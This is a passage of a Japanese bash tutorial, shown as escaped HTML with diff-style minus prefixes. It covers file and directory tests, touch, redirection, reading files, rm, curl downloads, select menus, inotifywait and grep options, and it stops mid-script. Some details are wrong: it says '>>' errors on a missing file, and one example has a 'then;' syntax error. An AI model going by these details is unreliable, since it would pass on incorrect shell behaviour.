-「if」ステートメントでディレクトリが存在するかどうかをチェックするためにはif文の条件式で「-d」フラグを使用します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:mkdir-p.sh" data-lang="bash:mkdir-p.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;enter directory name to check&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">read&lt;/span> direct&lt;span class="p">;&lt;/span>
-&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -d &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$direct&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$direct&lt;/span>&lt;span class="s2"> exists&amp;#34;&lt;/span>
-&lt;span class="k">else&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$direct&lt;/span>&lt;span class="s2"> doesn&amp;#39;t exist&amp;#34;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="ファイル操作">ファイル操作&lt;/h3>
-&lt;p>ファイルの作成には「touch」コマンドを使います。&lt;/p>
-&lt;div class="tips-area tips">
-&lt;dl>
-&lt;dt>ヒント&lt;/dt>
-&lt;dd>ディレクトリの作成には &amp;lsquo;mkdir&amp;rsquo; コマンド、&lt;/dd>
-&lt;dd>ファイルの作成には &amp;lsquo;touch&amp;rsquo; コマンドを使います。&lt;/dd>
-&lt;/dl>
-&lt;/div>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:touch.sh" data-lang="bash:touch.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;enter file name to create&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">read&lt;/span> fileName&lt;span class="p">;&lt;/span>
-touch &lt;span class="nv">$fileName&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>touchコマンドはmkdirコマンド同様、ファイルを作成しようとするその場所に、既に作成しようとするファイル明度同名のファイルが存在した場合、何もしません。&lt;/p>
-&lt;p>mkdir は、ディレクトリを作成する。同名のディレクトリがあればエラーとなります。&lt;/p>
-&lt;pre tabindex="0">&lt;code>ls
-directory2/
-$ mkdir directory2
-mkdir: directory2: File exists
-$
-&lt;/code>&lt;/pre>&lt;p>そこで、mkdir -p コマンドは、同名のディレクトリが既にあればエラーを返さず何もしない。なければディレクトリを作成。&lt;br>
-touchコマンドも同様で、同名のファイルが既にあればエラーを返さず何もせず、なければファイルを作成します。&lt;/p>
-&lt;div class="tips-area tips">
-&lt;dl>
-&lt;dt>ヒント&lt;/dt>
-&lt;dd>touchコマンドは既に同名のファイルがあれば、エラーを返さない代わりに何もしませんが、「:&amp;gt;」コマンドでファイルを作成した場合、既に作成しようとするその場所に同名のファイルがあった場合、空の新規ファイルで上書きします。（ですので、ファイルは強制的に作成されますが、データ内容は消滅します。&lt;/dd>
-&lt;/dl>
-&lt;/div>
-&lt;p>if文で -d フラグでディレクトリの存在を確認する事ができました。&lt;br>
-ファイルも同様に -f フラグでファイルの存在を確認する事ができます。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:checkFile.sh" data-lang="bash:checkFile.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;enter file name to check&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">read&lt;/span> fileName&lt;span class="p">;&lt;/span>
-&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2"> exists&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">else&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2"> doesn&amp;#39;t exist&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="テキストへのファイル出力">テキストへのファイル出力&lt;/h3>
-&lt;p>ファイルにテキストを追加するには、「&amp;gt;」リダイレクト、または「&amp;raquo;」アペンドを使います。&lt;br>
-「&amp;gt;」リダイレクトは、ファイルを新規に作成し直してから出力します。&lt;br>
-「&amp;raquo;」アペンドは、既にファイルが存在しているときに限定して出力します。&lt;/p>
-&lt;div class="tips-area tips">
-&lt;dl>
-&lt;dt>ヒント&lt;/dt>
-&lt;dd>「&amp;gt;」リダイレクトは、既にファイルが存在している場合も、ファイルを新規作成します。ですので、元々あったファイルの内容は空になります。からになってもらっては困ると言う場合は、「touch」コマンドを使います。&lt;/dd>
-&lt;dd>
-&lt;p>また、「&amp;raquo;」アペンドは、追記する場合に、ファイルがない場合はエラーとなります。こうした事にならないように、次の例文で、ファイルの存在を確認して処理を進めます。&lt;/p>
-&lt;/dd>
-&lt;/dl>
-&lt;/div>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:appendFile.sh" data-lang="bash:appendFile.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;入力ファイル名を指定して下さい&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">read&lt;/span> fileName&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ファイルに追記したい文字列を入力して下さい&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">read&lt;/span> fileText&lt;span class="p">;&lt;/span>
-&lt;span class="c1"># ファイルがあれば&lt;/span>
-&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
-&lt;span class="c1"># アペンド&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;アペンドします&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileText&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &amp;gt;&amp;gt; &lt;span class="nv">$fileName&lt;/span>
-&lt;span class="k">else&lt;/span>
-&lt;span class="c1"># リダイレクト&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;リダイレクトします&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileText&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &amp;gt; &lt;span class="nv">$fileName&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="ファイルの読み込み">ファイルの読み込み&lt;/h3>
-&lt;p>スクリプトを使用して任意のファイルを読み取ることもできます。上記の方法に従ってファイルを見つけます。その後、while条件を使用して「read -r line」を使用してファイルを読み取る。ファイルを読み取るので、このシンボル「&amp;lt;」を使用します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:whileRead.sh" data-lang="bash:whileRead.sh">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;読み込みたいファイル名を指定して下さい&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">read&lt;/span> fileName&lt;span class="p">;&lt;/span>
-&lt;span class="c1"># ファイルがあれば&lt;/span>
-&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
-&lt;span class="c1"># 読み込む&lt;/span>
-&lt;span class="k">while&lt;/span> &lt;span class="nb">read&lt;/span> line&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$line&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">done&lt;/span>&amp;lt;&lt;span class="nv">$fileName&lt;/span>
-&lt;span class="k">else&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2"> は存在しません&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>ファイルを削除するには、まずファイルが存在するかどうかを調べることです。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:rm.sh" data-lang="bash:rm.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;enter file name from which you want to delete&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">read&lt;/span> fileName&lt;span class="p">;&lt;/span>
-&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
-rm &lt;span class="nv">$fileName&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">else&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2"> doesn&amp;#39;t exist&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="tips-area tips">
-&lt;dl>
-&lt;dt>ヒント&lt;/dt>
-&lt;dd>rmコマンドは非常に危険なコマンドです。&lt;/dd>
-&lt;dd>ファイルの削除の都度確認を促す -i オプションをつけるなどをするとよいでしょう。&lt;/dd>
-&lt;dd>rmコマンドは、ファイルだけではなくディレクトリも削除できます。&lt;/dd>
-&lt;dd>再帰的に行いたい場合は、-r オプションをつけると良いです。&lt;/dd>
-&lt;/dl>
-&lt;/div>
-&lt;h2 id="curlコマンド">curlコマンド&lt;/h2>
-&lt;p>カールは、URL構文を持つデータファイルを取得、または送信するためのコマンドです。&lt;br>
-まず最初にしなければならないことはcurlをインストールすることです。&lt;/p>
-&lt;pre tabindex="0">&lt;code># 確認
-which curl
-/usr/bin/curl
-$
-&lt;/code>&lt;/pre>&lt;p>ない場合、&lt;/p>
-&lt;pre tabindex="0">&lt;code># macの場合
-$ sudo brew install curl
-&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code># linuxの場合
-$ yum install curl
-&lt;/code>&lt;/pre>&lt;p>curlをインストールした後、URLを使ってファイルをダウンロードするためのコードを記述します。&lt;br>
-curlを使用してデータファイルをダウンロードするには２つのステップが必要です。&lt;/p>
-&lt;p>１つ目は、そのファイルの完全なリンクアドレスを持つことです。&lt;br>
-２つ目は、そのアドレスをスクリプトの「url」変数に保存し、そのURLでcurlコマンドを使用してダウンロードすることです。ここで「-O」は、ダウンロードするファイル名は、実在のファイル名を継承すると言う意味となります。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:curl.sh" data-lang="bash:curl.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">url&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://www.ovh.net/files/1Mb.dat&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-curl &lt;span class="si">${&lt;/span>&lt;span class="nv">url&lt;/span>&lt;span class="si">}&lt;/span> -O&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>ダウンロードしたファイルに新しい名前を与えるには、「-o」オプションでファイル名を指定します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:curl2.sh" data-lang="bash:curl2.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">url&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://www.ovh.net/files/1Mb.dat&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-curl &lt;span class="si">${&lt;/span>&lt;span class="nv">url&lt;/span>&lt;span class="si">}&lt;/span> -o NewFileDownload&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>数百ギガバイトのサイズのファイルをダウンロードしたい場合はどうでしょう。&lt;br>
-適切なファイルをダウンロードしているかどうかを確認するためにヘッダーファイルをダウンロードすることができます。&lt;br>
-ファイルのURLの前に「-I」と書くだけです。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:curl3.sh" data-lang="bash:curl3.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">url&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://www.ovh.net/files/1Mb.dat&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-curl -I &lt;span class="si">${&lt;/span>&lt;span class="nv">url&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="selectコマンド">selectコマンド&lt;/h2>
-&lt;p>selectコマンドは、列挙したリストを表示させ、ユーザーに入力を促します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:select.sh" data-lang="bash:select.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="k">select&lt;/span> car in BMW MERCEDES TESLA ROVER TOYOTA&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;you have selected &lt;/span>&lt;span class="nv">$car&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">done&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash select.sh
-1) BMW 3) TESLA 5) TOYOTA
-2) MERCEDES 4) ROVER
-#? 3
-you have selected TESLA
-#? 4
-you have selected ROVER
-#?
-&lt;/code>&lt;/pre>&lt;p>この場合、選択した車のオプションが表示されますが、オプション以外の番号を入力すると何もしません。&lt;br>
-以下の例では、swich-caseを使用して、ユーザーが他の車のオプションを入力した場合、「1から5の間で選択してください」というエラーメッセージが表示されます。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:select.sh" data-lang="bash:select.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="k">select&lt;/span> car in BMW MERCEDES TESLA ROVER TOYOTA&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
-&lt;span class="k">case&lt;/span> &lt;span class="nv">$car&lt;/span> in
-BMW&lt;span class="o">)&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;BMW SELECTED&amp;#34;&lt;/span>&lt;span class="p">;;&lt;/span>
-MERCEDES&lt;span class="o">)&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;MERCEDES SELECTED&amp;#34;&lt;/span>&lt;span class="p">;;&lt;/span>
-TESLA&lt;span class="o">)&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;TESLA SELECTED&amp;#34;&lt;/span>&lt;span class="p">;;&lt;/span>
-ROVER&lt;span class="o">)&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ROVER SELECTED&amp;#34;&lt;/span>&lt;span class="p">;;&lt;/span>
-TOYOTA&lt;span class="o">)&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;TOYOTA SELECTED&amp;#34;&lt;/span>&lt;span class="p">;;&lt;/span>
-*&lt;span class="o">)&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ERROR! Please select between 1 to 5&amp;#34;&lt;/span>&lt;span class="p">;;&lt;/span>
-&lt;span class="k">esac&lt;/span>
-&lt;span class="k">done&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>プロのメニューでは、プログラムはユーザーの入力を待つ必要があります。&lt;br>
-このスクリプトでは、ユーザーに「続行するには任意のキーを押して」ように依頼し、「read -t 3 -n 1」コマンドを使用して3秒ごとにユーザーに「キーSirを押すのを待っています」というリマインダーを送信します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:select.sh" data-lang="bash:select.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;press any key to continue&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">while&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nb">true&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
-&lt;span class="c1"># ３秒ごとに入力を促す&lt;/span>
-&lt;span class="nb">read&lt;/span> -t &lt;span class="m">3&lt;/span> -n 1&lt;span class="p">;&lt;/span>
-&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$?&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;you have terminated the script&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-exit&lt;span class="p">;&lt;/span>
-&lt;span class="k">else&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;waiting for you to press the key Sir&amp;#34;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;span class="k">done&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="inotifyコマンド-ファイルの変更を監視する">inotifyコマンド ファイルの変更を監視する&lt;/h2>
-&lt;p>inotifyを使用してファイルを変更を監視するする方法を説明します。&lt;br>
-inotifyの正式名称は「inode notify」です。&lt;br>
-inotifyは、ファイルシステムの変更を監視し、、変更をアプリケーションに報告するLinuxカーネルサブシステムです。inotifyを操作するには、まずターミナルからinotifyをインストールする必要があります。&lt;/p>
-&lt;p>Linuxの場合&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ yum install inotify-tools
-&lt;/code>&lt;/pre>&lt;p>inotifyがどのように反応するかを確認します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:inotify.sh" data-lang="bash:inotify.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-mkdir -p iNotifyTest
-inotifywait -m iNotifyTest
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>では、ターミナルの出力を確認します。&lt;br>
-ターミナルをもう一つ起動して上記スクリプトを実行しているターミナルと並べて開きます。&lt;/p>
-&lt;p>モニターとしてのinotify.shの動作を見ながら別のターミナルウィンドウを開き、「$ touch file1.txt」でファイルを作成すると、inotifyが反応し、ファイルシステムで現在起こっているすべてのアクションを監視していることがわかります。&lt;/p>
-&lt;p>次に「file1.txt」に何かを書き、inotifyで動作するターミナルウィンドウからの応答を確認してください。&lt;/p>
-&lt;h2 id="grepコマンド">grepコマンド&lt;/h2>
-&lt;p>grepコマンドについてはここで詳しく書きました。&lt;br>
-&lt;a class="link" href="https://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/" target="_blank" rel="noopener"
->【 grep 特集】「ざっくりわかるシェルスクリプト４」&lt;/a>&lt;/p>
-&lt;p>それはそれとして、ここではざっくりと説明します。&lt;/p>
-&lt;p>grepは ‘global regular expression print’ の略です。&lt;br>
-このコマンドは、テキストを1行ずつ処理してファイル内のパターンを検索するために使用されます。&lt;br>
-まず、touchコマンドを使用してfilegrep.txtという名前のファイルを作成します。ターミナルに次のコードを入力します。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ touch filegrep.txt
-$ vim filegrep.txt
-&lt;/code>&lt;/pre>&lt;p>filegrep.txtを開き、ファイルに次のコンテンツを書き込みます。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:grepfile.txt" data-lang="bash:grepfile.txt">This is Linux
-This is Windows
-This is MAC
-This is Linux
-This is Windows
-This is MAC
-This is Linux
-This is Windows
-This is MAC
-This is Linux
-This is Windows
-This is MAC
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:grep.sh" data-lang="bash:grep.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;検索したいファイル名を指定して下さい。&amp;#34;&lt;/span>
-&lt;span class="c1"># 入力を grepfile.txt&lt;/span>
-&lt;span class="nb">read&lt;/span> fileName
-&lt;span class="k">if&lt;/span> &lt;span class="o">[[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;検索したい語句を入力して下さい。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">read&lt;/span> grepvar&lt;span class="p">;&lt;/span>
-grep &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$grepvar&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">else&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2"> はありません。&amp;#34;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash test
-検索したいファイル名を指定して下さい。
-grepfile.txt
-検索したい語句を入力して下さい。
-linux
-$
-&lt;/code>&lt;/pre>&lt;p>入力は「linux」（小文字のエル）ですが、ファイル内のテキストは「Linux」（大文字のエル）で書かれているため、検索結果には何も表示されません。ここでは、grepコマンドに「-i」のフラグを追加するだけで、この大文字と小文字を区別する問題に対処する必要があります。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:grep2.sh" data-lang="bash:grep2.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;検索したいファイル名を指定して下さい。&amp;#34;&lt;/span>
-&lt;span class="c1"># 入力を grepfile.txt&lt;/span>
-&lt;span class="nb">read&lt;/span> fileName
-&lt;span class="k">if&lt;/span> &lt;span class="o">[[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;検索したい語句を入力して下さい。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">read&lt;/span> grepvar&lt;span class="p">;&lt;/span>
-&lt;span class="c1"># 大文字小文字の区別をしないオプション -i&lt;/span>
-grep -i &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$grepvar&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">else&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2"> はありません。&amp;#34;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash grep2.sh
-検索したいファイル名を指定して下さい。
-grepfile.txt
-検索したい語句を入力して下さい。
-linux
-This is Linux
-This is Linux
-This is Linux
-This is Linux
-$
-&lt;/code>&lt;/pre>&lt;p>出力で行番号を抽出することもできます。このためには、grepコマンドに「-n」の別のフラグを追加するだけです。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:grep3.sh" data-lang="bash:grep3.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;検索したいファイル名を指定して下さい。&amp;#34;&lt;/span>
-&lt;span class="c1"># 入力を grepfile.txt&lt;/span>
-&lt;span class="nb">read&lt;/span> fileName
-&lt;span class="k">if&lt;/span> &lt;span class="o">[[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;検索したい語句を入力して下さい。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">read&lt;/span> grepvar&lt;span class="p">;&lt;/span>
-&lt;span class="c1"># 大文字小文字の区別をしないオプション -i&lt;/span>
-grep -in &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$grepvar&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">else&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2"> はありません。&amp;#34;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash grep3.sh
-検索したいファイル名を指定して下さい。
-grepfile.txt
-検索したい語句を入力して下さい。
-linux
-1:This is Linux
-4:This is Linux
-7:This is Linux
-10:This is Linux
-$
-&lt;/code>&lt;/pre>&lt;p>ドキュメント内の特定の単語の発生回数を取得することもできます。grepコマンド「grep -i -c $grepvar $fileName」に「-c」フラグを追加し、スクリプトを保存し、端末を使用して実行します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:grep4.sh" data-lang="bash:grep4.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;検索したいファイル名を指定して下さい。&amp;#34;&lt;/span>
-&lt;span class="c1"># 入力を grepfile.txt&lt;/span>
-&lt;span class="nb">read&lt;/span> fileName
-&lt;span class="k">if&lt;/span> &lt;span class="o">[[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
